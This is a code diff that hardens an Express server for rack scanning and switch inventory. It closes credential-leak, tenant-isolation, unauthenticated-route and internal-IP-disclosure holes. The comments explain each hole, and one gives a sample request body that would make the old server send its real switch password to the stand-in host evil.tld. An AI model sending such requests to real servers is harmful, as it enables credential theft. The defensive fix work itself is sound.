@@ -43,12 +43,38 @@ const { logger, withSpan, recordEvent } = o11y;
 
 // Merge stored env credentials (per vendor) into request body fields. Values
 // sent explicitly by the client take precedence over the env-stored defaults.
+// A host we are willing to spend stored credentials on: one that already has
+// its own per-host entry, or a row in monitored_devices. Anything else is a
+// host the caller invented.
+function isKnownSwitchHost(host) {
+  if (!host) return false;
+  if (sshCreds.getForHost(host)) return true;
+  try { return !!require('./lib/port_history_db').getDeviceByHost(host); }
+  catch { return false; }
+}
+
 function resolveSwitchCreds(body) {
   // Precedence: explicit client-sent value → per-host stored → per-vendor stored.
   // Per-host lets two switches of the same vendor (e.g. .13 and .14, both
   // TP-Link) carry different passwords without one clobbering the other.
   const h = body.host ? (sshCreds.getForHost(body.host) || {}) : {};
-  const v = sshCreds.getForVendor(body.vendor || 'cisco-ios') || {};
+  // Only fall back to the vendor-wide secret for a host we already know.
+  //
+  // This used to be unconditional, and it was a credential-exfiltration hole:
+  // the vendor fallback ignored WHICH host was asked for, so any authenticated
+  // caller — a member, i.e. any tester — could POST
+  //   {"host":"evil.tld","vendor":"cisco-ios"}
+  // with no username/password, and the server would dial evil.tld and offer our
+  // real switch password to whatever was listening. The `!host || !username ||
+  // !password` guards on those routes all PASSED, because the stored creds had
+  // just filled the blanks in.
+  //
+  // Explicit client-supplied creds are still honoured for any host: that's the
+  // "try these credentials against this switch" flow, and it leaks nothing we
+  // didn't already receive from the caller.
+  const v = isKnownSwitchHost(body.host)
+    ? (sshCreds.getForVendor(body.vendor || 'cisco-ios') || {})
+    : {};
   const clientEnable = body.enablePassword;
   return {
     username:       body.username || h.username || v.username || '',
@@ -66,6 +92,22 @@ function softAuthUserId(req) {
   return softAuthPayload(req)?.sub || null;
 }
 
+// Resolve the JWT signing secret EXACTLY as auth.js:38 does:
+//   const JWT_SECRET = process.env.JWT_SECRET || loadOrCreateSecret();
+// This used to read data/jwt.secret and nothing else, which was a landmine:
+// setting JWT_SECRET (the obvious thing to do in production) made auth.js sign
+// with the env value while softAuthPayload verified against the file. Every
+// verify would fail, softAuthPayload would return null for every request, and
+// app.param('rackId') — whose `if (!auth) return next()` means "unauthenticated,
+// let the route decide" — would wave EVERY request past the tenant check.
+// Tenant isolation would silently vanish the day someone set an env var.
+function jwtSecret() {
+  if (process.env.JWT_SECRET) return process.env.JWT_SECRET;
+  const secretPath = path.join(__dirname, 'data', 'jwt.secret');
+  if (!fs.existsSync(secretPath)) return null;
+  return fs.readFileSync(secretPath, 'utf8').trim();
+}
+
 // Same as above but returns the whole JWT payload (so callers can also
 // read tenantId for tenant-scoped reads on otherwise public routes).
 function softAuthPayload(req) {
@@ -73,11 +115,38 @@ function softAuthPayload(req) {
   const m = header.match(/^Bearer\s+(.+)$/i);
   if (!m) return null;
   try {
-    const secretPath = path.join(__dirname, 'data', 'jwt.secret');
-    if (!fs.existsSync(secretPath)) return null;
-    const secret = fs.readFileSync(secretPath, 'utf8').trim();
+    const secret = jwtSecret();
+    if (!secret) return null;
     return jwt.verify(m[1], secret);
   } catch { return null; }
+}
+
+// ── Report links ─────────────────────────────────────────────────────
+// GET /api/scan/:rackId/report is loaded as an <iframe src>, which cannot
+// carry an Authorization header — that is the only reason it was public, and
+// being public it served any tenant's rack to anyone who knew (or guessed) an
+// id. Instead of leaving it open, the client asks an authenticated endpoint
+// for a short-lived token scoped to ONE rack and puts that in the iframe URL.
+// Signed with the same secret, so no new key material and nothing to rotate.
+const REPORT_TOKEN_TTL_SEC = 300;
+
+function signReportToken(rackId) {
+  const secret = jwtSecret();
+  if (!secret) return null;
+  return jwt.sign({ scope: 'report', rackId }, secret, { expiresIn: REPORT_TOKEN_TTL_SEC });
+}
+
+// Returns true only for a live token minted for THIS rack. A general user JWT
+// is deliberately rejected (scope check): a report token is a narrow capability
+// and must not be interchangeable with a session token, in either direction.
+function verifyReportToken(token, rackId) {
+  if (!token) return false;
+  try {
+    const secret = jwtSecret();
+    if (!secret) return false;
+    const p = jwt.verify(token, secret);
+    return p && p.scope === 'report' && p.rackId === rackId;
+  } catch { return false; }
 }
 
 const app  = express();
@@ -132,8 +201,18 @@ function canAccessRack(auth, rackId) {
 }
 
 app.param('rackId', (req, res, next, rackId) => {
+  // A report token is a capability for exactly this rack: let it through, but
+  // ONLY for this rack, and only while it's valid.
+  if (verifyReportToken(req.query.t, rackId)) return next();
+
   const auth = softAuthPayload(req);
-  if (!auth) return next();                       // unauthenticated — unchanged
+  // Fail CLOSED. This used to be `if (!auth) return next()` — "no token, let
+  // the route decide" — which meant an unauthenticated caller skipped the
+  // tenant check entirely. Combined with the then-public /api/racks it let
+  // anyone enumerate every tenant's racks and POST /api/scan/<id>/outlook to
+  // mail their report anywhere. Every :rackId route now requires auth (or a
+  // report token), so there is no legitimate anonymous caller left.
+  if (!auth) return res.status(401).json({ error: 'Authentication required' });
   // Owner oversees the whole platform.
   if (auth.role === 'owner') return next();
   // Org admin sees any rack owned by a Site in their org.
@@ -261,12 +340,21 @@ try {
 // Mock data-source routes — simulates ServiceNow, NetBox, Orion, Spectrum,
 // and Generic REST APIs so the app works without real external services.
 // Routes: /api/now/*, /api/dcim/*, /SolarWinds/*, /spectrum/*, /api/v1/*
-try {
-  app.use(require('./mock_routes'));
-  logger.info({ event: 'router.loaded', router: 'mock_routes' }, 'mock data-source routes loaded');
-} catch (err) {
-  logger.warn({ event: 'router.load_failed', router: 'mock_routes', err: err.message },
-    'mock data-source routes not loaded');
+// Gated: these serve fixture data with their own ad-hoc Basic auth, and were
+// mounted unconditionally — publicly reachable over the tunnel in production.
+// Enabled when MOCK_SERVER_URL is set (i.e. something is actually pointed at
+// them) or outside production, so existing setups keep working unchanged.
+if (process.env.MOCK_SERVER_URL || process.env.NODE_ENV !== 'production') {
+  try {
+    app.use(require('./mock_routes'));
+    logger.info({ event: 'router.loaded', router: 'mock_routes' }, 'mock data-source routes loaded');
+  } catch (err) {
+    logger.warn({ event: 'router.load_failed', router: 'mock_routes', err: err.message },
+      'mock data-source routes not loaded');
+  }
+} else {
+  logger.info({ event: 'router.skipped', router: 'mock_routes' },
+    'mock data-source routes disabled (production, MOCK_SERVER_URL unset)');
 }
 
 // CMDB-ticket integration — every CMDB write is gated behind an SR
@@ -4707,7 +4795,7 @@ app.post('/api/incidents/:inc/post-work-note', auth.requireAuth, async (req, res
  * If no auth token is present, falls back to the legacy "all racks" view
  * but logged so we can see if anything still hits it that way.
  */
-app.get('/api/racks', (req, res) => {
+app.get('/api/racks', auth.requireAuth, (req, res) => {
   try {
     const auth = softAuthPayload(req);
     const tid = auth?.tenantId;
@@ -4821,6 +4909,21 @@ app.get('/api/scans', auth.requireAuth, (req, res) => {
 //   GET /api/scan/:rackId/report?format=csv      → CSV (Excel opens this directly)
 //   POST /api/scan/:rackId/report                → regenerates HTML file and returns metadata
 // The HTML file lives at outputs/<rackId>/report.html (single self-contained file with inline images).
+// Mints a short-lived token for ONE rack so the report <iframe src> can prove
+// access without an Authorization header. requireAuth runs first, and
+// app.param('rackId') has already enforced tenant scope by the time we get
+// here — so a caller can only ever mint a token for a rack they can already
+// read.
+app.get('/api/scan/:rackId/report-token', auth.requireAuth, (req, res) => {
+  const t = signReportToken(req.params.rackId);
+  if (!t) return res.status(500).json({ error: 'cannot sign report token' });
+  res.json({ token: t, expires_in: REPORT_TOKEN_TTL_SEC });
+});
+
+// Reachable two ways: a normal Authorization header (ProfilePage fetches
+// format=json via authFetch), or ?t=<report token> for the iframe. Either way
+// app.param('rackId') above has already authorised this rack — this route does
+// not need its own gate, and adding requireAuth here would break the iframe.
 app.get('/api/scan/:rackId/report', async (req, res) => {
   const { rackId } = req.params;
   const format = (req.query.format || 'meta').toLowerCase();
@@ -4965,7 +5068,7 @@ app.get('/api/cmdb/rack/:rackId/switches', auth.requireAuth, (req, res) => {
 // Serves the topology snapshot written by servicenow/bootstrap_cmdb_full.py
 // (mirror of CMDB rack→device→port tree + Connects-to cable edges).
 // Snapshot lives at outputs/<rackId>/topology.json.
-app.get('/api/topology/:rackId', (req, res) => {
+app.get('/api/topology/:rackId', auth.requireAuth, (req, res) => {
   const { rackId } = req.params;
   res.setHeader('Cache-Control', 'no-store');
   const snapPath = path.join(outputsDir, rackId, 'topology.json');
@@ -4988,7 +5091,7 @@ app.get('/api/topology/:rackId', (req, res) => {
 // per-port arrays, units_detected, originalExt, etc. The All Components and
 // Topology pages call this on mount so port counts stay in sync with the
 // underlying device_unit_map.json after re-detection runs.
-app.get('/api/scan/:rackId', (req, res) => {
+app.get('/api/scan/:rackId', auth.requireAuth, (req, res) => {
   const { rackId } = req.params;
   res.setHeader('Cache-Control', 'no-store');
   const rackDir = path.join(outputsDir, rackId);
@@ -5003,7 +5106,7 @@ app.get('/api/scan/:rackId', (req, res) => {
   }
 });
 
-app.get('/api/scan/:rackId/result', (req, res) => {
+app.get('/api/scan/:rackId/result', auth.requireAuth, (req, res) => {
   const { rackId } = req.params;
   res.setHeader('Cache-Control', 'no-store');
   const rackDir = path.join(outputsDir, rackId);
@@ -6641,12 +6744,20 @@ app.post('/api/switch/audit', auth.requireAuth, async (req, res) => {
     host: h, sshPort, vendorKey, username, password, enablePassword,
   });
 
-  // Self-heal: try the requested host, then the in-office bench switch. A stale
-  // or changed client IP (e.g. .14 → .33) recovers here without any user action.
-  const benchHost = (process.env.TPLINK_BENCH_HOST || '').trim();
-  const candidates = [...new Set([host, benchHost].filter(Boolean))];
+  // Only ever audit the host the caller asked for.
+  //
+  // This used to fall back to TPLINK_BENCH_HOST ("self-heal: a stale client IP
+  // recovers without user action"), which quietly turned the route into a
+  // disclosure primitive: post any junk host, the loop falls through to the
+  // bench switch, and the response echoes back host:"192.168.1.33" along with
+  // its serial, MAC table and LLDP neighbours — handing an attacker the exact
+  // internal IP they need to then aim resolveSwitchCreds at it. The convenience
+  // wasn't worth an endpoint that answers about a switch nobody asked about.
+  //
+  // The stale-IP case it existed for is now served properly: /api/lab/devices
+  // resolves hosts server-side from monitored_devices.
   let lastErr = null;
-  for (const h of candidates) {
+  for (const h of [host]) {
     try {
       const data = await gather(h);
       _dbg(`OK ${Date.now() - _t0}ms host=${h} neighbors=${Object.keys(data.neighbors).length} macs=${Object.keys(data.macs).length} identity=${data.identity.name || '?'}`);
@@ -7365,7 +7476,7 @@ async function runShareSender(req, res, { rackId, channel, pyModule, email, extr
   });
 }
 
-app.post('/api/scan/:rackId/slack', async (req, res) => {
+app.post('/api/scan/:rackId/slack', auth.requireAuth, async (req, res) => {
   const { rackId } = req.params;
   const email   = (req.body?.email || process.env.SLACK_RECIPIENT_EMAIL || '').trim();
   const comment = (req.body?.comment || `Rack scan report for ${rackId}`).toString();
@@ -7375,7 +7486,7 @@ app.post('/api/scan/:rackId/slack', async (req, res) => {
   });
 });
 
-app.post('/api/scan/:rackId/teams', async (req, res) => {
+app.post('/api/scan/:rackId/teams', auth.requireAuth, async (req, res) => {
   const { rackId } = req.params;
   const email   = (req.body?.email || process.env.TEAMS_RECIPIENT_EMAIL || '').trim();
   const message = (req.body?.message || `Rack scan report for ${rackId}`).toString();
@@ -7385,7 +7496,7 @@ app.post('/api/scan/:rackId/teams', async (req, res) => {
   });
 });
 
-app.post('/api/scan/:rackId/outlook', async (req, res) => {
+app.post('/api/scan/:rackId/outlook', auth.requireAuth, async (req, res) => {
   const { rackId } = req.params;
   const email   = (req.body?.email || process.env.OUTLOOK_RECIPIENT_EMAIL || '').trim();
   const subject = (req.body?.subject || `Rack scan report for ${rackId}`).toString();
